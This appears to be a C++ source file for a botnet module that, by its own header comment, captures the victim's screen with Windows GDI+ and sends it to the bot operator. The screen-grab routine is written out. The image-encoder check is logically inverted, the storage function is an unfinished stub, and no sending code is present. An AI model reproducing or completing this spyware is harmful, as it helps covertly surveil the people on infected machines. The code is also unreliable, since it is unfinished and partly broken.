//This tool will be used to screenshot the active users screen and then proceed to send it 
//over to the owner controlling the bots

//Windows headers 
#include <Windows.h>
#include <gdiplus.h>

#ifndef TIME
#define TIME
	#include "general_macro.hpp" //Has time function and sysinfoapi.h 
#else
	#include <time.h>
#endif

#include <iostream>
#include <cerrno> 
#include <memory>
#include <algorithm>
#include <filesystem>

//Thanks to https://gist.github.com/prashanthrajagopal/05f8ad157ece964d8c4d for original code
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
	//using namespace Gdiplus;
	UINT  num = 0;
	UINT  size = 0;

	//Probably put this into a constexpr macro for compile time opt?
	const WCHAR* InvalidImageTypes[]{
		L"image/bmp",
		L"image/tiff",
		L"image/pcx",
		L"image/tga",
		L"image/iff",
		L"image/sgi", 
		L"image/xpm",
		L"image/pix",
		L"image/ras",
		L"image/sun",
		L"image/wbmp",
		L"image/pict",
		L"image/tiff",
		L"image/dib",
		L"image/xwd",
		L"image/icb",
		L"image/vda",
		L"image/pgm",
		L"image/ppm",
		L"image/pbm",
		L"image/cut",
	};

	Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;

	Gdiplus::GetImageEncodersSize(&num, &size);
	if (size == 0)
		return -1;

	pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
	if (pImageCodecInfo == NULL)
		return -1;

	GetImageEncoders(num, size, pImageCodecInfo);
	for (UINT j = 0; j < num; ++j)
	{
		if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
		{	
			bool isValid = std::count(std::begin(InvalidImageTypes), std::end(InvalidImageTypes),
				pImageCodecInfo[j].MimeType) > 0;

			if (!isValid) {
				std::cerr << "Invalid image type: " << &pImageCodecInfo[j].MimeType << std::endl;
				free(pImageCodecInfo);
				return -1;
			}
			*pClsid = pImageCodecInfo[j].Clsid;
			free(pImageCodecInfo);
			return j;
		}
	}
	free(pImageCodecInfo);
	return 0;
}

//Continue working
void StoreImage(const char *directory, WCHAR* image) {
	bool filesystem_exists = std::filesystem::exists(directory);
	if (!filesystem_exists) {
		std::filesystem::create_directory("Client_Picture");
	}
	//Store images to the directory
}

void gdiscreen(WCHAR* file_type) {
	//using namespace Gdiplus;
	IStream* istream;
	HRESULT res = CreateStreamOnHGlobal(NULL, true, &istream);
	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
	{
		HDC scrdc, memdc;
		HBITMAP membit;
		scrdc = ::GetDC(0);
		int Height = GetSystemMetrics(SM_CYSCREEN);
		int Width = GetSystemMetrics(SM_CXSCREEN);
		memdc = CreateCompatibleDC(scrdc);
		membit = CreateCompatibleBitmap(scrdc, Width, Height);
		HBITMAP hOldBitmap = (HBITMAP)SelectObject(memdc, membit);
		BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);

		Gdiplus::Bitmap bitmap(membit, NULL);
		CLSID clsid	;
		GetEncoderClsid(file_type, &clsid);
		bitmap.Save(istream, &clsid, NULL);
		DeleteObject(memdc);
		DeleteObject(membit);
		::ReleaseDC(0, scrdc);
	}
	Gdiplus::GdiplusShutdown(gdiplusToken);
}
